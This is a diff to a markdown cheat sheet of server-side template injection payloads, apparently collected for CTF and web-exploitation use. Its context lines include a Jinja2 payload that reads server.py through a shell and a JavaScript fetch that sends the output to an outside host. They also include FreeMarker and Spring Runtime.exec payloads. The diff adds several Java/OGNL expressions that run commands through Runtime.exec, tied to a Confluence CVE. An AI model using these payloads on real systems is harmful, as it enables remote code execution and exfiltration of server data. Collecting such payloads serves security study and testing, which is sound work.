@@ -275,7 +275,6 @@ Clone:
         body: "url=1&score=1&feedback=%7B%7B%20%27%27.__class__.__ mro__%5B1%5D.__ subclasses__%2829%5B412%5D%28%22cat%20server.py%22%2Cshell%3DTrue%2Cstdout%3D-1%29.communicate%28%29%20%7D%7D&nam=1"}).then(response => response.text()).then(data => fetch("http://demo.itmo.xyz/?nnn="+encodeURI(data)).then(response => document.write(response)));
     </script>
     ```
-
 - freemarker
     ```java
     // https://ruvlol.medium.com/rce-in-jira-cve-2019-11581-901b845f0f
@@ -284,7 +283,6 @@ Clone:
     // https://cyc10n3.medium.com/rce-via-server-side-template-injection-ad46f8e0c2ae
     ${"".getClass().forName("java.lang.Runtime").getMethods()[6].invoke("".getClass().forName("java.lang.Runtime")).exec("ls")}
     ```
-
 - spring, thymeleaf
     ```
     // Note: Only first word returned due to space splitting
@@ -302,6 +300,16 @@ Clone:
     <spring:message text="${/"/".getClass().forName(/"java.lang.Runtime/").getMethod(/"getRuntime/",null).invoke(null,null).exec(/"calc/",null).toString()}">
     </spring:message>
     ```
+- generic
+    - https://www.zerodayinitiative.com/blog/2021/9/21/cve-2021-26084-details-on-the-recently-exploited-atlassian-confluence-ognl-injection-bug
+        ```java
+        // Validation
+        Stream.of(Class.forName("java.lang.Runtime").getDeclaredMethods()).forEach(m -> System.out.println(m));
+
+        "" + Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(null).exec("touch /tmp/1") + "";
+        "" + ((Runtime)Class.forName("java.lang.Runtime").getMethod("getRuntime", null).invoke(null, null)).exec("touch /tmp/1") + "";
+        "" + ((Runtime)Class.forName("java.lang.Runtime").getMethod("getRuntime", (Class<?>[])null).invoke(null, (Object[])null)).exec("touch /tmp/1") + "";
+        ```
 
 - https://github.com/w181496/Web-CTF-Cheatsheet#ssti
 - https://y4er.com/post/java-expression-injection/
